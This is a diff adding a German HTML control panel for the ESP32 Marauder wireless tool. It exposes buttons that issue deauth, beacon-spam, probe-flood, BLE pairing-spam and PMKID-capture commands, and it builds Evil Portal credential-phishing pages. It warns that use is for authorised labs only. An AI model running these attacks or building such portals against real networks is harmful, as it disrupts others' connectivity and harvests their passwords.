@@ -1,0 +1,1271 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Marauder Control Center – ESP32-S3</title>
+<style>
+  :root{
+    --bg:#101317; --panel:#171b21; --panel2:#1e232b; --border:#282e38;
+    --text:#e2e6ec; --muted:#8b93a1; --faint:#5c6472;
+    --accent:#6d8cff; --accent-soft:rgba(109,140,255,.12);
+    --red:#e26d64; --red-soft:rgba(226,109,100,.10);
+    --amber:#d6a95a; --amber-soft:rgba(214,169,90,.09);
+    --green:#5bbd77; --green-soft:rgba(91,189,119,.10);
+    --tx:#8aa6ff; --rx:#78cf90;
+    --radius:10px;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{margin:0;font-family:"Segoe UI",system-ui,sans-serif;background:var(--bg);color:var(--text);
+    display:flex;flex-direction:column;overflow:hidden;font-size:13px;line-height:1.5}
+  ::-webkit-scrollbar{width:10px;height:10px}
+  ::-webkit-scrollbar-thumb{background:#2c333f;border-radius:6px}
+  ::-webkit-scrollbar-thumb:hover{background:#39414f}
+  ::-webkit-scrollbar-track{background:transparent}
+
+  /* Header */
+  header{display:flex;align-items:center;gap:14px;padding:11px 20px;background:var(--panel);
+    border-bottom:1px solid var(--border);flex-wrap:wrap}
+  .logo{font-size:14px;font-weight:600;white-space:nowrap;letter-spacing:.2px}
+  .logo span{color:var(--muted);font-weight:500}
+  .badges{display:flex;gap:7px;flex-wrap:wrap}
+  .badge{font-size:11px;padding:3px 10px;border-radius:7px;background:var(--panel2);border:1px solid var(--border);
+    color:var(--muted);white-space:nowrap}
+  .badge b{color:var(--text);font-weight:600}
+  .badge.mode-scan{color:var(--accent)}
+  .badge.mode-attack{color:var(--red)}
+  .spacer{flex:1}
+  .connbar{display:flex;align-items:center;gap:9px}
+  .dot{width:8px;height:8px;border-radius:50%;background:var(--faint);transition:.2s}
+  .dot.on{background:var(--green)}
+
+  label{font-size:12px;color:var(--muted)}
+  select,input,button,textarea{background:var(--bg);color:var(--text);border:1px solid var(--border);
+    border-radius:8px;padding:7px 10px;font-size:12px;font-family:inherit;outline:none}
+  select:focus,input:focus,textarea:focus{border-color:var(--accent)}
+  button{cursor:pointer;background:var(--panel2);transition:background .12s,border-color .12s}
+  button:hover:not(:disabled){border-color:var(--faint);background:#242a33}
+  button:disabled{opacity:.38;cursor:not-allowed}
+  button.primary{background:var(--accent);border-color:var(--accent);color:#0c1020;font-weight:600}
+  button.primary:hover:not(:disabled){background:#7f9bff;border-color:#7f9bff}
+  button.go{background:var(--green);border-color:var(--green);color:#08210f;font-weight:600}
+  button.go:hover:not(:disabled){background:#69c884;border-color:#69c884}
+  button.danger{border-color:transparent;background:var(--red-soft);color:var(--red)}
+  button.warnb{border-color:transparent;background:var(--amber-soft);color:var(--amber)}
+  input[type=checkbox]{accent-color:var(--accent)}
+  input[type=number]{width:72px}
+  code{background:var(--bg);padding:1px 6px;border-radius:5px;color:var(--accent);font-size:11px;border:1px solid var(--border)}
+  a{color:var(--accent);text-decoration:none}
+  a:hover{text-decoration:underline}
+  h2{font-size:18px;font-weight:600;margin:0 0 4px}
+  h3{font-size:11px;text-transform:uppercase;letter-spacing:.7px;color:var(--faint);margin:22px 0 10px;font-weight:600}
+  .sub{color:var(--muted);font-size:12.5px;margin:0 0 18px;max-width:760px}
+
+  /* Layout */
+  .app{flex:1;display:flex;overflow:hidden;min-height:0}
+  nav{width:82px;min-width:82px;background:var(--panel);border-right:1px solid var(--border);
+    display:flex;flex-direction:column;padding:10px 0;gap:3px;overflow-y:auto}
+  .nav-item{position:relative;display:flex;flex-direction:column;align-items:center;gap:4px;padding:11px 4px;margin:0 8px;
+    border-radius:10px;color:var(--muted);cursor:pointer;font-size:10px;transition:.12s}
+  .nav-item .ic{font-size:19px;opacity:.85}
+  .nav-item:hover{background:var(--panel2);color:var(--text)}
+  .nav-item.active{background:var(--accent-soft);color:var(--accent)}
+  .nav-item.active .ic{opacity:1}
+  .nav-item.active::before{content:"";position:absolute;left:-8px;top:20%;bottom:20%;width:3px;border-radius:3px;background:var(--accent)}
+  .nav-item.flash.active{background:var(--amber-soft);color:var(--amber)}
+  .nav-item.flash.active::before{background:var(--amber)}
+  .nav-sep{flex:1}
+
+  .content{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
+  .view{flex:1;overflow-y:auto;padding:26px 30px;display:none}
+  .view.active{display:block}
+
+  /* Console drawer */
+  .console{border-top:1px solid var(--border);background:var(--panel);display:flex;flex-direction:column;
+    transition:height .15s;height:240px}
+  .console.collapsed{height:40px}
+  .console-head{display:flex;align-items:center;gap:9px;padding:8px 16px;cursor:pointer;user-select:none;
+    border-bottom:1px solid var(--border)}
+  .console-head .title{font-size:12px;font-weight:600}
+  .console-head input[type=text]{flex:1;max-width:280px}
+  #log{flex:1;overflow-y:auto;padding:10px 16px;font-family:"Cascadia Code",Consolas,monospace;font-size:12px;
+    line-height:1.5;white-space:pre-wrap;word-break:break-all}
+  .console.collapsed #log,.console.collapsed .console-tools,.console.collapsed .sendbar{display:none}
+  .line-tx{color:var(--tx)} .line-rx{color:var(--rx)} .line-sys{color:var(--amber)}
+  .line-err{color:var(--red)} .line-flash{color:var(--accent)} .hidden{display:none!important}
+  .ts{color:var(--faint);font-size:11px}
+  .console-tools{display:flex;flex-wrap:wrap;gap:12px;align-items:center;padding:7px 16px;font-size:11px;
+    border-top:1px solid var(--border)} .console-tools .grp{display:flex;align-items:center;gap:6px}
+  .sendbar{display:flex;gap:8px;padding:9px 16px;border-top:1px solid var(--border)}
+  .sendbar input[type=text]{flex:1}
+
+  /* Cards / grids */
+  .cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px;margin-bottom:6px}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:16px}
+  .card .k{font-size:10.5px;color:var(--faint);text-transform:uppercase;letter-spacing:.6px}
+  .card .v{font-size:22px;font-weight:600;margin-top:6px}
+  .card .v.sm{font-size:15px;font-weight:500}
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:9px}
+  .grid.g2{grid-template-columns:repeat(auto-fill,minmax(230px,1fr))}
+  .btn{padding:11px 12px;text-align:center;border-radius:9px;font-size:12px;line-height:1.3}
+  .btn.stop{background:var(--red-soft);border-color:transparent;color:var(--red)}
+  .btn.atk{background:var(--red-soft);border-color:transparent;color:#e8938c}
+  .btn.ble{background:var(--panel2)}
+  .btn.big{padding:15px;font-size:14px}
+  .row{display:flex;gap:9px;align-items:center;flex-wrap:wrap;margin:10px 0}
+  .panelbox{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:18px;margin-bottom:18px}
+  .warnbox{border:1px solid var(--border);border-left:3px solid var(--amber);background:var(--amber-soft);
+    border-radius:8px;padding:11px 14px;font-size:12px;color:#dcc99b;margin:12px 0;line-height:1.55}
+  .okbox{border:1px solid var(--border);border-left:3px solid var(--green);background:var(--green-soft);
+    border-radius:8px;padding:14px;margin-bottom:16px}
+  .hint{font-size:11.5px;color:var(--muted);line-height:1.6;margin:7px 0}
+
+  /* Tables */
+  table{width:100%;border-collapse:collapse;font-size:12px}
+  th,td{text-align:left;padding:8px 12px;border-bottom:1px solid var(--border)}
+  th{color:var(--faint);font-size:10.5px;text-transform:uppercase;letter-spacing:.4px;font-weight:600;
+    position:sticky;top:0;background:var(--panel2)}
+  tbody tr:last-child td{border-bottom:0}
+  tr:hover td{background:var(--panel2)}
+  td.mac{font-family:"Cascadia Code",Consolas,monospace;color:var(--muted)}
+  .tablewrap{max-height:340px;overflow:auto;border:1px solid var(--border);border-radius:var(--radius);background:var(--panel)}
+  .tcount{font-size:11px;color:var(--faint);font-weight:400;text-transform:none;letter-spacing:0}
+
+  /* toggle */
+  .sw{position:relative;width:38px;height:20px;background:var(--panel2);border:1px solid var(--border);border-radius:20px;cursor:pointer;flex:none}
+  .sw::after{content:"";position:absolute;top:1px;left:1px;width:16px;height:16px;border-radius:50%;background:var(--muted);transition:.15s}
+  .sw.on{background:var(--green-soft);border-color:var(--green)} .sw.on::after{left:19px;background:var(--green)}
+
+  /* progress */
+  .progwrap{height:14px;background:var(--bg);border:1px solid var(--border);border-radius:8px;overflow:hidden;margin:12px 0}
+  .progbar{height:100%;width:0;background:var(--green);transition:width .15s}
+  .fileline{display:flex;gap:9px;align-items:center;margin:7px 0}
+  .fileline input[type=file]{flex:1;padding:6px;font-size:11px}
+  .fileline input[type=text]{width:96px}
+  .step{font-size:11px;color:var(--accent);font-weight:600;margin:16px 0 7px}
+
+  /* preview */
+  .previewwrap{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  .previewwrap textarea{width:100%;height:280px;font-family:monospace;font-size:11px}
+  .previewwrap iframe{width:100%;height:280px;border:1px solid var(--border);border-radius:var(--radius);background:#fff}
+  @media(max-width:900px){.previewwrap{grid-template-columns:1fr}}
+
+  /* command palette */
+  .modal{position:fixed;inset:0;background:rgba(0,0,0,.55);display:none;align-items:flex-start;justify-content:center;z-index:50;backdrop-filter:blur(2px)}
+  .modal.open{display:flex}
+  .palette{margin-top:90px;width:580px;max-width:92%;background:var(--panel);border:1px solid var(--border);
+    border-radius:14px;box-shadow:0 24px 70px rgba(0,0,0,.6);overflow:hidden}
+  .palette input{width:100%;border:0;border-bottom:1px solid var(--border);border-radius:0;padding:16px 18px;font-size:15px;background:transparent}
+  .palette .list{max-height:360px;overflow-y:auto}
+  .pi{display:flex;justify-content:space-between;align-items:center;padding:11px 18px;cursor:pointer;border-bottom:1px solid var(--border)}
+  .pi.sel,.pi:hover{background:var(--accent-soft)}
+  .pi .c{font-family:monospace;color:var(--accent)}
+  .pi .cat{font-size:10px;color:var(--faint);text-transform:uppercase;letter-spacing:.5px}
+  kbd{background:var(--bg);border:1px solid var(--border);border-radius:5px;padding:1px 6px;font-size:10px;color:var(--muted)}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo">📡 Marauder <span>Control Center</span></div>
+  <div class="badges">
+    <span class="badge" id="bChip">Chip: —</span>
+    <span class="badge" id="bFw">FW: —</span>
+    <span class="badge" id="bCh">Kanal: —</span>
+    <span class="badge" id="bMode">Modus: Idle</span>
+  </div>
+  <div class="spacer"></div>
+  <span class="badge">RX <b id="rxc">0</b> · TX <b id="txc">0</b> B</span>
+  <div class="connbar">
+    <span class="dot" id="dot"></span><span id="statusText" style="font-size:12px">Getrennt</span>
+    <label>Baud</label>
+    <select id="baud">
+      <option>9600</option><option>19200</option><option>38400</option><option>57600</option>
+      <option selected>115200</option><option>230400</option><option>460800</option><option>921600</option>
+    </select>
+    <button class="primary" id="connect">Verbinden</button>
+    <button class="danger" id="disconnect" disabled>Trennen</button>
+    <button id="paletteBtn" title="Command Palette (Strg+K)">⌘K</button>
+  </div>
+</header>
+
+<div class="app">
+  <nav id="nav">
+    <div class="nav-item active" data-view="dash"><span class="ic">🏠</span>System</div>
+    <div class="nav-item" data-view="wifi"><span class="ic">📶</span>WiFi</div>
+    <div class="nav-item" data-view="atk"><span class="ic">💥</span>Attack</div>
+    <div class="nav-item" data-view="ble"><span class="ic">🦷</span>BLE</div>
+    <div class="nav-item" data-view="portal"><span class="ic">🎣</span>Portal</div>
+    <div class="nav-item" data-view="gps"><span class="ic">🛰️</span>GPS</div>
+    <div class="nav-item" data-view="set"><span class="ic">⚙️</span>Settings</div>
+    <div class="nav-item" data-view="macro"><span class="ic">📜</span>Macros</div>
+    <div class="nav-sep"></div>
+    <div class="nav-item flash" data-view="flash"><span class="ic">⚡</span>Flash</div>
+  </nav>
+
+  <div class="content">
+    <!-- ===================== DASHBOARD ===================== -->
+    <section class="view active" data-view="dash">
+      <h2>System-Dashboard</h2>
+      <p class="sub">Zentrale Übersicht & Schnellzugriff. Command Palette mit <kbd>Strg</kbd>+<kbd>K</kbd>.</p>
+      <div class="cards">
+        <div class="card"><div class="k">Verbindung</div><div class="v sm" id="dConn">Getrennt</div></div>
+        <div class="card"><div class="k">Chip</div><div class="v sm" id="dChip">—</div></div>
+        <div class="card"><div class="k">Firmware</div><div class="v sm" id="dFw">—</div></div>
+        <div class="card"><div class="k">Kanal</div><div class="v" id="dCh">—</div></div>
+        <div class="card"><div class="k">Modus</div><div class="v sm" id="dMode">Idle</div></div>
+        <div class="card"><div class="k">APs / STAs</div><div class="v sm" id="dCounts">0 / 0</div></div>
+      </div>
+      <h3>Schnellaktionen</h3>
+      <div class="grid" id="dashQuick"></div>
+      <div class="warnbox" id="dashLoop" style="display:none">
+        ⚠ <b>Boot-Loop erkannt</b> — Board rebootet endlos, Firmware läuft nicht. → Tab <b>⚡ Flash</b> → 🚀 Auto-Flash.
+      </div>
+      <div class="okbox">
+        <b>Erste Schritte:</b> Board an UART-USB-C → oben <b>Verbinden</b> @115200 → <code>help</code>.
+        Läuft keine Firmware (Boot-Loop) → Tab <b>Flash</b> → <b>🚀 Board reparieren</b>.
+      </div>
+    </section>
+
+    <!-- ===================== WIFI ===================== -->
+    <section class="view" data-view="wifi">
+      <h2>WiFi</h2>
+      <p class="sub">Netze scannen, Ergebnisse landen live in den Tabellen unten. Ziel per Klick markieren/wählen, dann im Attack-Tab angreifen.</p>
+      <div class="warnbox" style="border-color:var(--border);background:var(--panel);color:var(--muted)">
+        <b>Ablauf:</b> 1) <code>scanap</code> = WLAN-Netze (Access Points) suchen · 2) <code>scansta</code> = mit den APs verbundene Geräte (Stationen/Clients) suchen · 3) <code>stopscan</code> · 4) Tabelle füllt sich · 5) Zeile → <b>select</b> = als Ziel markieren.<br>
+        <b>Merke Marauder-Flags:</b> <code>-a</code>=Access Points · <code>-s</code>=SSID-Namensliste · <code>-c</code>=Stationen/Clients.
+      </div>
+      <div class="row">
+        <button class="btn primary" id="smartScan" title="Tool hüpft selbst durch alle Kanäle 1-13 und sammelt Beacons — findet APs auch wenn scanap klemmt.">🔎 Smart-Scan (alle Kanäle)</button>
+        <button class="btn" data-cmd="scanap" title="Firmware-Scan (hüpft nur wenn Kanal-Hopping an ist). Ergebnisse in AP-Tabelle.">📡 scanap</button>
+        <button class="btn" data-cmd="scansta" title="Sucht Geräte (Clients), die mit APs verbunden sind. Erst APs scannen/wählen.">📱 scansta</button>
+        <button class="btn stop" id="wifiStop" data-cmd="stopscan" title="Beendet Scan/Angriff/Smart-Scan.">■ stopscan</button>
+        <button class="btn" data-cmd="list -a" title="Gefundene Access Points anzeigen (füllt AP-Tabelle).">APs anzeigen</button>
+        <button class="btn" data-cmd="list -c" title="Gefundene Stationen/Clients anzeigen (füllt Stationen-Tabelle).">Stationen anzeigen</button>
+        <button class="btn" data-cmd="list -s" title="Selbst gebaute SSID-Namensliste anzeigen (für Beacon-Spam).">SSID-Liste anzeigen</button>
+        <label style="margin-left:8px" title="Automatisch AP/Station-Zeilen aus dem Datenstrom in die Tabellen parsen."><input type="checkbox" id="liveParse" checked> Live-Parse</label>
+        <label title="Fester Funkkanal 1-14. Ohne Setzen hüpft Marauder beim Scannen durch.">Kanal</label><input type="number" id="chNum" value="1" min="1" max="14">
+        <button class="btn" id="setCh" title="Setzt den festen Funkkanal (channel -s).">channel setzen</button>
+      </div>
+
+      <h3>Access Points (WLAN-Netze) <span class="tcount">(<span id="apCount">0</span>)</span>
+        <button class="btn" id="apSelMarked" style="padding:4px 8px" title="Alle angehakten APs als Angriffsziel markieren (select -a).">angehakte als Ziel (select -a)</button>
+        <button class="btn" id="apClear" style="padding:4px 8px">Tabelle leeren</button>
+      </h3>
+      <div class="hint">Ein Access Point = ein WLAN-Router/Netz. <b>select</b> in der Zeile markiert ihn als Ziel für Deauth / Beacon-Clone / Probe.</div>
+      <div class="tablewrap">
+        <table><thead><tr><th title="anhaken für Mehrfachauswahl"></th><th>#</th><th title="Signalstärke, näher an 0 = stärker">RSSI</th><th>Kanal</th><th>BSSID (MAC)</th><th>SSID (Name)</th><th></th></tr></thead>
+        <tbody id="apRows"></tbody></table>
+      </div>
+
+      <h3>Stationen / Clients <span class="tcount">(<span id="staCount">0</span>)</span>
+        <button class="btn" id="staSelMarked" style="padding:4px 8px" title="Alle angehakten Stationen als Ziel markieren (select -c).">angehakte als Ziel (select -c)</button>
+        <button class="btn" id="staClear" style="padding:4px 8px">Tabelle leeren</button>
+      </h3>
+      <div class="hint">Eine Station = ein mit einem AP verbundenes Gerät (Handy, Laptop). Nötig für gezielten Deauth (<code>attack -t deauth -c</code>).</div>
+      <div class="tablewrap">
+        <table><thead><tr><th></th><th>#</th><th>RSSI</th><th>Kanal</th><th>MAC</th><th>Name</th><th></th></tr></thead>
+        <tbody id="staRows"></tbody></table>
+      </div>
+
+      <h3>Sniffer (nur mithören, kein Angriff)</h3>
+      <div class="hint">Zeigt bestimmte WLAN-Pakete live an. Rein passiv/lesend. Zum Verstehen was in der Luft passiert. <code>stopscan</code> beendet.</div>
+      <div class="grid">
+        <button class="btn" data-cmd="sniffbeacon" title="Beacon-Frames: die 'Ich bin hier'-Rufe von Access Points.">beacon — AP-Ansagen</button>
+        <button class="btn" data-cmd="sniffprobe" title="Probe-Requests: Geräte, die nach bekannten Netzen suchen (verrät Gerätenamen/Netze).">probe — Gerätesuchen</button>
+        <button class="btn" data-cmd="sniffdeauth" title="Deauth-Frames: erkennt laufende Deauth-Angriffe in der Umgebung.">deauth — Angriffe erkennen</button>
+        <button class="btn" data-cmd="sniffpwn" title="Pwnagotchi-Geräte in der Nähe erkennen.">pwnagotchi</button>
+        <button class="btn" data-cmd="sniffesp" title="Andere ESP32/ESP8266-Geräte erkennen.">esp — ESP-Geräte</button>
+        <button class="btn" data-cmd="sniffraw" title="Rohe Paketanzahl/Aktivität pro Kanal.">raw — Rohpakete</button>
+      </div>
+      <div class="row">
+        <label title="PMKID = Handshake-Fragment für WPA-Passwort-Cracking. Speichert PCAP auf SD.">PMKID Kanal</label>
+        <input type="number" id="pmkidCh" value="1" min="1" max="14">
+        <button class="btn" id="pmkidBtn" title="Fängt PMKID auf gewähltem Kanal (fürs spätere Offline-Cracken). Braucht SD für PCAP.">PMKID fangen (sniffpmkid -d)</button>
+      </div>
+      <h3>SSID-Namensliste bauen (für Beacon-Spam „list")</h3>
+      <div class="hint">Erzeugt eine Liste von Netznamen im Marauder. Wird von <code>attack -t beacon -l</code> als Fake-Netze ausgestrahlt. Anzeigen mit „SSID-Liste anzeigen".</div>
+      <div class="row">
+        <label title="So viele zufällige Namen erzeugen.">Zufalls-Anzahl</label><input type="number" id="ssidGen" value="10" min="1">
+        <button class="btn" id="ssidGenBtn" title="Erzeugt N zufällige SSID-Namen (ssid -a -g).">zufällige erzeugen</button>
+        <input type="text" id="ssidName" placeholder="eigener SSID-Name" style="width:180px">
+        <button class="btn" id="ssidNameBtn" title="Fügt einen eigenen Namen zur Liste hinzu (ssid -a -n).">Name hinzufügen</button>
+      </div>
+    </section>
+
+    <!-- ===================== ATTACK ===================== -->
+    <section class="view" data-view="atk">
+      <h2>Attack</h2>
+      <p class="sub">⚠ <b>Nur eigene / schriftlich autorisierte Netze.</b> Deauth & Co. stören fremden Funk — in DE ohne Erlaubnis strafbar (§ 303b StGB, TKG). Zum Lernen im eigenen Labor.</p>
+      <div class="cards">
+        <div class="card"><div class="k">Markierte APs</div><div class="v" id="aMarkAp">0</div></div>
+        <div class="card"><div class="k">Markierte Stationen</div><div class="v" id="aMarkSta">0</div></div>
+        <div class="card"><div class="k">Modus</div><div class="v sm" id="aMode">Idle</div></div>
+      </div>
+
+      <h3>Deauth — Geräte vom WLAN trennen</h3>
+      <div class="hint"><b>Was:</b> Sendet „Verbindung-trennen"-Frames, sodass Geräte vom WLAN fliegen (kurzzeitig kein Internet). <b>Voraussetzung:</b> erst im WiFi-Tab scannen und Ziel markieren.</div>
+      <div class="grid g2">
+        <button class="btn atk" data-cmd="attack -t deauth" title="Trennt alle Clients der im WiFi-Tab gewählten APs (select -a). Erst scanap + AP wählen.">deauth alle Clients gewählter APs</button>
+        <button class="btn atk" data-cmd="attack -t deauth -c" title="Trennt nur die gewählten Stationen (select -c). Erst scansta + Station wählen.">deauth gezielt (gewählte Stationen)</button>
+      </div>
+      <div class="hint">Handmodus ohne Scan: unten in der Konsole <code>attack -t deauth -s &lt;Quell-MAC&gt; -d &lt;Ziel-MAC&gt;</code> tippen.</div>
+
+      <h3>Beacon Spam — viele Fake-WLANs vortäuschen</h3>
+      <div class="hint"><b>Was:</b> Strahlt massenhaft erfundene Netznamen aus, sodass in der WLAN-Liste der Opfer viele Fake-Netze erscheinen.</div>
+      <div class="grid g2">
+        <button class="btn atk" data-cmd="attack -t beacon -r" title="Sendet zufällige Netznamen. Keine Vorbereitung nötig.">beacon random (Zufallsnamen)</button>
+        <button class="btn atk" data-cmd="attack -t beacon -l" title="Sendet deine SSID-Namensliste. Erst im WiFi-Tab Liste bauen.">beacon list (eigene Namen)</button>
+        <button class="btn atk" data-cmd="attack -t beacon -a" title="Klont die gewählten echten APs (select -a). Erst scanap + AP wählen.">beacon clone (gewählte APs)</button>
+        <button class="btn atk" data-cmd="attack -t rickroll" title="Spammt SSIDs mit Rickroll-Songtext. Spaß-Demo.">rickroll</button>
+      </div>
+
+      <h3>Probe Flood</h3>
+      <div class="hint"><b>Was:</b> Sendet massenhaft Probe-Requests (Netz-Suchanfragen) für die gewählten APs — kann APs/Logs fluten. <b>Voraussetzung:</b> scanap + AP wählen.</div>
+      <div class="grid g2">
+        <button class="btn atk" data-cmd="attack -t probe" title="Probe-Request-Flut für gewählte APs (select -a).">probe flood (gewählte APs)</button>
+      </div>
+
+      <div style="margin-top:20px">
+        <button class="btn stop big" data-cmd="stopscan" style="width:100%" title="Beendet sofort jeden laufenden Angriff/Scan.">■ STOP — alle Angriffe/Scans beenden</button>
+      </div>
+    </section>
+
+    <!-- ===================== BLE ===================== -->
+    <section class="view" data-view="ble">
+      <h2>Bluetooth / BLE</h2>
+      <p class="sub">Bluetooth-Low-Energy scannen und (im Labor) Spam testen. ⚠ Spam stört echte Geräte in Reichweite — nur autorisiert nutzen.</p>
+      <h3>Scannen (passiv)</h3>
+      <div class="row">
+        <button class="btn ble" data-cmd="blescan -t all" title="Sucht alle BLE-Geräte in der Nähe (Kopfhörer, Uhren, Beacons...). Füllt Tabelle.">blescan — alle Geräte</button>
+        <button class="btn ble" data-cmd="sniffbt" title="Zeigt Bluetooth-Aktivität/Advertising live an.">sniffbt — BT mithören</button>
+        <button class="btn ble" data-cmd="sniffskim" title="Sucht gezielt nach bekannten Kreditkarten-Skimmer-BLE-Modulen.">skimmer — Kartenskimmer suchen</button>
+        <button class="btn stop" data-cmd="stopscan">stopscan</button>
+        <label style="margin-left:8px" title="BLE-Geräte automatisch in die Tabelle parsen."><input type="checkbox" id="bleParse" checked> Live-Parse</label>
+        <button class="btn" id="bleClear" style="padding:4px 8px">Tabelle leeren</button>
+      </div>
+      <h3>Gefundene Geräte <span class="tcount">(<span id="bleCount">0</span>)</span></h3>
+      <div class="tablewrap">
+        <table><thead><tr><th>#</th><th>RSSI</th><th>MAC</th><th>Name</th></tr></thead><tbody id="bleRows"></tbody></table>
+      </div>
+      <h3>BLE-Spam (Pairing-Popups fluten)</h3>
+      <div class="hint"><b>Was:</b> Sendet massenhaft gefälschte Pairing-/Verbinden-Ansagen. Betroffene Geräte zeigen ständig „Gerät koppeln?"-Popups und werden unbenutzbar, solange es läuft. <code>stopscan</code> beendet.</div>
+      <div class="grid g2">
+        <button class="btn atk" data-cmd="blespam -t apple" title="Sour Apple: iOS-Verbinden-Popups fluten (kann iOS 17 zum Absturz bringen).">Apple (Sour Apple)</button>
+        <button class="btn atk" data-cmd="blespam -t samsung" title="Samsung Watch-Pairing-Popups fluten.">Samsung</button>
+        <button class="btn atk" data-cmd="blespam -t google" title="Android/Google Fast-Pair-Popups fluten.">Google (Fast Pair)</button>
+        <button class="btn atk" data-cmd="blespam -t microsoft" title="Windows Swift-Pair-Popups fluten.">Microsoft (Swift Pair)</button>
+        <button class="btn atk" data-cmd="blespam -t all" title="Alle obigen gleichzeitig.">alle Typen</button>
+        <button class="btn atk" data-cmd="spoofle" title="Gibt sich als anderes BLE-Gerät aus (Advertising-Spoofing).">spoofle (Gerät vortäuschen)</button>
+      </div>
+    </section>
+
+    <!-- ===================== PORTAL ===================== -->
+    <section class="view" data-view="portal">
+      <h2>Evil Portal</h2>
+      <p class="sub">⚠ Nur autorisierte Tests. Braucht SD-Karte am ESP32 (ab FW v0.11). HTML nur von SD.</p>
+      <div class="warnbox">
+        <b>ESP32-S3-DevKitC-1 hat keinen SD-Slot.</b> Für Portal SPI-microSD-Modul verdrahten (SCK/MISO/MOSI/CS, Pins im <code>configs.h</code> des Builds).
+        Ohne SD: Portal nicht nutzbar — WiFi/BLE/Attack gehen aber ohne SD.
+      </div>
+      <div class="hint"><b>Was ist Evil Portal:</b> Marauder macht ein WLAN auf und zeigt jedem, der sich verbindet, eine Login-Seite (Captive Portal). Eingegebene Daten werden auf SD geloggt. Zum Testen des eigenen Netzes / Awareness-Schulung.</div>
+      <h3>Steuerung</h3>
+      <div class="row">
+        <button class="btn atk" data-cmd="evilportal -c start" title="Startet das Portal mit index.html von der SD-Root.">Portal starten (index.html)</button>
+        <button class="btn stop" data-cmd="evilportal -c stop" title="Stoppt das Portal.">Portal stoppen</button>
+        <input type="text" id="epFile" placeholder="datei.html" style="width:150px" title="Dateiname einer HTML-Datei auf der SD.">
+        <button class="btn atk" id="epStartFile" title="Startet mit einer bestimmten HTML-Datei (start -w).">start mit Datei</button>
+        <button class="btn" id="epSetHtml" title="Wählt HTML-Datei ohne zu starten (sethtml).">HTML wählen</button>
+        <label title="Index eines gescannten APs, dessen Namen das Portal-WLAN übernimmt.">AP-Index</label><input type="number" id="epAp" value="0" min="0">
+        <button class="btn" id="epSetAp" title="Portal-WLAN übernimmt Namen des gewählten APs (setap).">AP-Name übernehmen</button>
+      </div>
+      <h3>Portal-HTML bauen <span class="tcount">(kein Serial-Upload — index.html per Kartenleser auf SD-Root)</span></h3>
+      <div class="row">
+        <label>Vorlage</label>
+        <select id="epTpl"><option value="login">Generisches Login</option><option value="wifi">WiFi-Zugang</option>
+          <option value="router">Router-Update</option><option value="blank">Leer</option></select>
+        <button class="btn" id="epLoadTpl">laden</button>
+        <button class="btn" id="epFromFile">aus Datei</button>
+        <input type="file" id="epFilePick" accept=".html,.htm" class="hidden">
+        <button class="btn go" id="epDownload">⬇ index.html</button>
+        <input type="text" id="epCfgSsid" placeholder="AP-Name" style="width:150px">
+        <button class="btn" id="epDownloadCfg">⬇ ap.config.txt</button>
+      </div>
+      <div class="previewwrap">
+        <textarea id="epHtml" placeholder="HTML... 'laden' für Vorlage"></textarea>
+        <iframe id="epPrev"></iframe>
+      </div>
+      <div class="hint">Formulare posten an <code>/get</code> → Marauder loggt nach <code>evil_portal_x.log</code> auf SD.</div>
+    </section>
+
+    <!-- ===================== GPS ===================== -->
+    <section class="view" data-view="gps">
+      <h2>GPS / Wardrive</h2>
+      <p class="sub">Wardriving = im Auto/zu Fuß WLANs sammeln und mit GPS-Position auf SD loggen (z.B. für WiGLE). <b>Braucht ein GPS-Modul am ESP32 (UART) und SD-Karte.</b> Ohne die Hardware liefern diese Befehle nichts.</p>
+      <div class="grid g2">
+        <button class="btn" data-cmd="gps" title="Zeigt GPS-Status: Fix vorhanden? Wie viele Satelliten?">gps — Status/Fix prüfen</button>
+        <button class="btn" data-cmd="gpsdata" title="Zeigt rohe GPS-Daten (Position, Zeit, Satelliten).">gpsdata — Positionsdaten</button>
+        <button class="btn" data-cmd="wardrive" title="Sammelt Access Points + GPS-Koordinaten und schreibt sie auf SD.">wardrive — APs + GPS loggen</button>
+        <button class="btn" data-cmd="wardrivestation" title="Wie wardrive, aber sammelt Stationen/Clients + GPS.">wardrive station — Clients + GPS</button>
+        <button class="btn stop" data-cmd="stopscan">stopscan</button>
+      </div>
+      <div class="panelbox" style="margin-top:14px">
+        <div class="hint">Geräte-Ausgabe (aus <code>gps</code> / <code>gpsdata</code>) — aktualisiert sich live:</div>
+        <div id="gpsOut" style="font-family:monospace;font-size:12px;color:var(--accent);white-space:pre-wrap;max-height:220px;overflow:auto">— noch nichts abgerufen —</div>
+      </div>
+    </section>
+
+    <!-- ===================== SETTINGS ===================== -->
+    <section class="view" data-view="set">
+      <h2>Settings</h2>
+      <p class="sub">Live-Abbild der Geräte-Einstellungen. <b>Abrufen</b> klicken → die echten Werte erscheinen hier und die Schalter zeigen den aktuellen Stand. Schalter klicken = am Gerät ändern.</p>
+      <div class="row">
+        <button class="btn primary" data-cmd="settings" title="Liest alle Einstellungen vom Gerät und aktualisiert die Tabelle.">⟳ Einstellungen abrufen</button>
+        <span class="tcount" id="setInfo">noch nicht abgerufen</span>
+        <div class="spacer"></div>
+        <input type="text" id="setKey" placeholder="Setting-Name" style="width:170px">
+        <input type="text" id="setVal" placeholder="Wert" style="width:120px">
+        <button class="btn" id="setCustom" title="settings -s Name Wert">setzen</button>
+      </div>
+      <div class="tablewrap" style="margin-top:6px">
+        <table><thead><tr><th>Einstellung</th><th>Wert</th><th>Bedeutung</th><th style="width:150px">Ändern</th></tr></thead>
+        <tbody id="setRows"></tbody></table>
+      </div>
+    </section>
+
+    <!-- ===================== MACROS ===================== -->
+    <section class="view" data-view="macro">
+      <h2>Macro-Bibliothek</h2>
+      <p class="sub">Befehlssequenzen. <code>#</code>=Kommentar, <code>wait 500</code>=Pause ms. Speichern, laden, ausführen.</p>
+      <div class="row">
+        <select id="macroLib" style="min-width:200px"></select>
+        <button class="btn" id="macroLoad">laden</button>
+        <button class="btn danger" id="macroDelete">löschen</button>
